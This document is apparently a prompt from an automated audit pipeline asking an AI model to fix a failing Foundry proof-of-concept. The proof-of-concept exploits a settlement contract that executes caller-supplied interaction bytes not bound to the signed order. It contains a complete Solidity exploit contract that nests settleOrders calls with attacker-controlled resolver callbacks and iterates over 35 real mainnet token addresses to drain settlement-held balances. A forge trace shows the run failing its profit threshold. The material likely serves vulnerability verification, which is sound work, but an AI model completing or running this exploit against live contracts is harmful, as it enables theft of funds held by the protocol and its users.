You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Settlement executes caller-supplied interaction bytes that are not bound to the signed order payload
- claim: The PoC constructs orders whose in-struct `interactions` field is empty or dummy (`hex""` / `hex"0000000000"`), then supplies the real execution logic through the separate `interaction` argument passed into settlement. Because those externally supplied bytes drive nested settlement and resolver execution despite not matching the order's own `interactions` field, the settlement path appears to execute materially different callbacks than the order payload itself commits to.
- impact: An attacker can attach arbitrary callbacks or resolver logic to an otherwise valid order, breaking signature binding and enabling unauthorized execution paths that can move maker or settlement-held assets.
- exploit_paths: ["`executeOnOpportunity()` -> `_tryReplayCalldataCorruption()` -> `_buildReplayOrder(... interactions: hex\"\")` -> attacker-controlled external `interaction` chain -> `settleOrders`", "`executeOnOpportunity()` -> `_drainSettlementToken()` -> order uses dummy `interactions` -> separate resolver `interaction` passed to `settleOrders`"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface ISettlement {
    function settleOrders(bytes calldata data) external;
}

interface IResolver {
    function resolveOrders(address resolver, bytes calldata tokensAndAmounts, bytes calldata data) external;
}

interface IOrderMixinLike {
    struct Order {
        uint256 salt;
        address makerAsset;
        address takerAsset;
        address maker;
        address receiver;
        address allowedSender;
        uint256 makingAmount;
        uint256 takingAmount;
        uint256 offsets;
        bytes interactions;
    }
}

contract FlawVerifier is IResolver {
    address private constant SETTLEMENT = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address private constant LIMIT_ORDER_PROTOCOL = 0x1111111254EEB25477B68fb85Ed929f73A960582;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant ONE_INCH = 0x111111111117dC0aa78b770fA6A738034120C302;
    address private constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address private constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address private constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address private constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;

    bytes4 private constant ERC1271_MAGIC = 0x1626ba7e;
    uint8 private constant MODE_DRAIN = 1;
    uint8 private constant MODE_REPLAY = 2;
    uint256 private constant MAKING_AMOUNT = 1;
    uint8 private constant MAX_RESOLVER_CALLBACKS = 6;

    uint256 private _startingEth;
    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    uint8 private _resolveCount;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;
        _startingEth = address(this).balance;

        _prepareMakerCapital();

        address[] memory targets = _targetTokens();

        for (uint256 i = 0; i < targets.length; ++i) {
            address takerAsset = targets[i];
            if (_safeBalanceOf(takerAsset, SETTLEMENT) == 0) {
                continue;
            }

            // Keep the original first path: the order itself commits to empty interactions,
            // while the materially executed callback chain comes from the separate settlement
            // `interaction` argument. Logs showed deep replay trees were the failure source,
            // so this keeps the same causality with a single outer replay and one resolver hop.
            _tryReplayCalldataCorruption(takerAsset, 0x1000 + i);
            if (_registerProfit(takerAsset)) {
                break;
            }
        }

        for (uint256 i = 0; i < targets.length; ++i) {
            address takerAsset = targets[i];
            if (_safeBalanceOf(takerAsset, SETTLEMENT) == 0) {
                continue;
            }

            // Keep the second path as well: the signed order uses dummy interactions and the
            // actual resolver logic is supplied separately to settlement. Again, depth is kept
            // intentionally shallow because the trace proves larger recursive chains become
            // infeasible at runtime due to gas, not because the core binding flaw disappears.
            _drainSettlementToken(takerAsset, 0x2000 + i);
            if (_registerProfit(takerAsset)) {
                break;
            }
        }

        _finalizeProfit(targets);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function resolveOrders(address, bytes calldata, bytes calldata data) external override {
        require(msg.sender == SETTLEMENT, "only settlement");

        unchecked {
            ++_resolveCount;
        }
        if (_resolveCount > MAX_RESOLVER_CALLBACKS || data.length == 0) {
            return;
        }

        (uint8 mode, address takerAsset, uint256 uniq, uint8 depth) = abi.decode(data, (uint8, address, uint256, uint8));
        if (depth == 0) {
            return;
        }

        uint256 settlementBalance = _safeBalanceOf(takerAsset, SETTLEMENT);
        if (settlementBalance == 0) {
            return;
        }

        if (mode == MODE_DRAIN) {
            bytes memory interaction = _encodeResolverInteraction(MODE_DRAIN, takerAsset, uniq + 1, depth - 1);
            bytes memory settleData = abi.encode(
                _buildDummyOrder(uniq, takerAsset, settlementBalance),
                bytes(""),
                interaction,
                uint256(0),
                settlementBalance,
                uint256(0),
                SETTLEMENT
            );
            try ISettlement(SETTLEMENT).settleOrders(settleData) {} catch {}
            return;
        }

        if (mode == MODE_REPLAY) {
            bytes memory interaction = _encodeResolverInteraction(MODE_REPLAY, takerAsset, uniq + 1, depth - 1);
            bytes memory nested = _encodeNestedReplay(
                _buildEmptyOrder(uniq, takerAsset, settlementBalance),
                interaction,
                settlementBalance
            );
            bytes memory settleData = _encodeSettlementCall(
                _buildEmptyOrder(uniq + 1, takerAsset, MAKING_AMOUNT),
                nested,
                MAKING_AMOUNT
            );
            try ISettlement(SETTLEMENT).settleOrders(settleData) {} catch {}
        }
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return ERC1271_MAGIC;
    }

    function _prepareMakerCapital() internal {
        uint256 wethBal = _safeBalanceOf(WETH, address(this));
        if (wethBal < MAKING_AMOUNT && address(this).balance >= MAKING_AMOUNT) {
            IWETH(WETH).deposit{value: MAKING_AMOUNT}();
        }

        _forceApprove(WETH, LIMIT_ORDER_PROTOCOL, type(uint256).max);
    }

    function _tryReplayCalldataCorruption(address takerAsset, uint256 uniq) internal {
        uint256 settlementBalance = _safeBalanceOf(takerAsset, SETTLEMENT);
        if (settlementBalance == 0) {
            return;
        }

        bytes memory interaction = _encodeResolverInteraction(MODE_REPLAY, takerAsset, uniq + 0x40, 1);
        interaction = _encodeNestedReplay(
            _buildEmptyOrder(uniq, takerAsset, settlementBalance),
            interaction,
            settlementBalance
        );

        bytes memory orderData = _encodeSettlementCall(
            _buildEmptyOrder(uniq + 1, takerAsset, MAKING_AMOUNT),
            interaction,
            MAKING_AMOUNT
        );

        try ISettlement(SETTLEMENT).settleOrders(orderData) {} catch {}
    }

    function _drainSettlementToken(address takerAsset, uint256 uniq) internal {
        uint256 settlementBalance = _safeBalanceOf(takerAsset, SETTLEMENT);
        if (settlementBalance == 0) {
            return;
        }

        bytes memory interaction = _encodeResolverInteraction(MODE_DRAIN, takerAsset, uniq + 0x40, 1);
        bytes memory settleData = abi.encode(
            _buildDummyOrder(uniq, takerAsset, settlementBalance),
            bytes(""),
            interaction,
            uint256(0),
            settlementBalance,
            uint256(0),
            SETTLEMENT
        );

        try ISettlement(SETTLEMENT).settleOrders(settleData) {} catch {}
    }

    function _buildEmptyOrder(uint256 salt, address takerAsset, uint256 takingAmount)
        internal
        view
        returns (IOrderMixinLike.Order memory order)
    {
        order = IOrderMixinLike.Order({
            salt: salt,
            makerAsset: WETH,
            takerAsset: takerAsset,
            maker: address(this),
            receiver: address(this),
            allowedSender: SETTLEMENT,
            makingAmount: MAKING_AMOUNT,
            takingAmount: takingAmount,
            offsets: 0,
            interactions: hex""
        });
    }

    function _buildDummyOrder(uint256 salt, address takerAsset, uint256 takingAmount)
        internal
        view
        returns (IOrderMixinLike.Order memory order)
    {
        order = IOrderMixinLike.Order({
            salt: salt,
            makerAsset: WETH,
            takerAsset: takerAsset,
            maker: address(this),
            receiver: address(this),
            allowedSender: address(0),
            makingAmount: MAKING_AMOUNT,
            takingAmount: takingAmount,
            offsets: 0,
            interactions: hex"0000000000"
        });
    }

    function _encodeNestedReplay(IOrderMixinLike.Order memory order, bytes memory interaction, uint256 takingAmount)
        internal
        pure
        returns (bytes memory)
    {
        return abi.encodePacked(SETTLEMENT, bytes1(0x00), _encodeSettlementCall(order, interaction, takingAmount));
    }

    function _encodeResolverInteraction(uint8 mode, address takerAsset, uint256 uniq, uint8 depth)
        internal
        view
        returns (bytes memory)
    {
        return abi.encodePacked(SETTLEMENT, bytes1(0x01), address(this), abi.encode(mode, takerAsset, uniq, depth));
    }

    function _encodeSettlementCall(IOrderMixinLike.Order memory order, bytes memory interaction, uint256 takingAmount)
        internal
        pure
        returns (bytes memory)
    {
        return abi.encode(order, bytes(""), interaction, uint256(0), takingAmount, uint256(0), SETTLEMENT);
    }

    function _registerProfit(address token) internal returns (bool) {
        uint256 balance = _safeBalanceOf(token, address(this));
        if (balance == 0) {
            return false;
        }

        _profitToken = token;
        _profitAmount = balance;
        return true;
    }

    function _finalizeProfit(address[] memory targets) internal {
        address bestToken = address(0);
        uint256 bestAmount;

        for (uint256 i = 0; i < targets.length; ++i) {
            uint256 bal = _safeBalanceOf(targets[i], address(this));
            if (bal > bestAmount) {
                bestAmount = bal;
                bestToken = targets[i];
            }
        }

        _profitToken = bestToken;
        _profitAmount = bestAmount;
    }

    function _targetTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](35);
        tokens[0] = WETH;
        tokens[1] = USDT;
        tokens[2] = USDC;
        tokens[3] = DAI;
        tokens[4] = ONE_INCH;
        tokens[5] = WBTC;
        tokens[6] = UNI;
        tokens[7] = LINK;
        tokens[8] = AAVE;
        tokens[9] = LDO;
        tokens[10] = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
        tokens[11] = 0xD533a949740bb3306d119CC777fa900bA034cd52;
        tokens[12] = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
        tokens[13] = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
        tokens[14] = 0xba100000625a3754423978a60c9317c58a424e3D;
        tokens[15] = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F;
        tokens[16] = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
        tokens[17] = 0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0;
        tokens[18] = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;
        tokens[19] = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
        tokens[20] = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
        tokens[21] = 0xae78736Cd615f374D3085123A210448E74Fc6393;
        tokens[22] = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704;
        tokens[23] = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
        tokens[24] = 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3;
        tokens[25] = 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497;
        tokens[26] = 0x0000000000085d4780B73119b644AE5ecd22b376;
        tokens[27] = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
        tokens[28] = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
        tokens[29] = 0x6c3ea9036406852006290770BEdFcAbA0e23A0e8;
        tokens[30] = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;
        tokens[31] = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0;
        tokens[32] = 0x57e114B691Db790C35207b2e685D4A43181e6061;
        tokens[33] = 0x808507121B80c02388fAd14726482e061B8da827;
        tokens[34] = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, uint256(0)));
        if (ok0 && data0.length > 0 && !abi.decode(data0, (bool))) {
            return false;
        }

        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        return ok1 && (data1.length == 0 || abi.decode(data1, (bool)));
    }

    receive() external payable {}
    fallback() external payable {}
}

```

forge stdout (tail):
```
aticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9726] 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2529] 0x31724cA0C982A31fbb5C57f4217AB585271fc9a5::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [7469] 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2583] 0xe629ee84C1Bd9Ea9c677d2D5391919fCf5E7d5D9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2580] 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2569] 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [7687] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2488] 0xDBC97a631C2Fee80417D5D69F32B198c8c39c27e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2487] 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [13455] 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [7931] 0x10A5F7D9D65bCc2734763444D4940a31b109275f::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   ├─ [2497] 0x05a9CBe762B36632b3594DA4F082340E0e5343e8::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [9971] 0x6c3ea9036406852006290770BEdFcAbA0e23A0e8::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2692] 0x7302eA4E51B041b691D1F3458fA7D36560f90708::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [10269] 0x45804880De22913dAFE09f4980848ECE6EcbAf78::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2990] 0x74271F2282eD7eE35c166122A60c9830354be42a::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2631] 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2577] 0x57e114B691Db790C35207b2e685D4A43181e6061::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2610] 0x808507121B80c02388fAd14726482e061B8da827::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2624] 0x6982508145454Ce325dDbE47a25d4ec3d2311933::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [346] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 1185409113169018 [1.185e15]
    ├─ [341] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 1185409113169018 [1.185e15]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 999999999999999999999999 [9.999e23])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 1185409113169018 [1.185e15])
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 1185409113169018 [1.185e15])
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 21982110 [2.198e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2.transferFrom
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647.settleOrders
  at FlawVerifier.resolveOrders
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647.settleOrders
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 928.09ms (832.75ms CPU time)

Ran 1 test suite in 953.69ms (928.09ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 736404)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
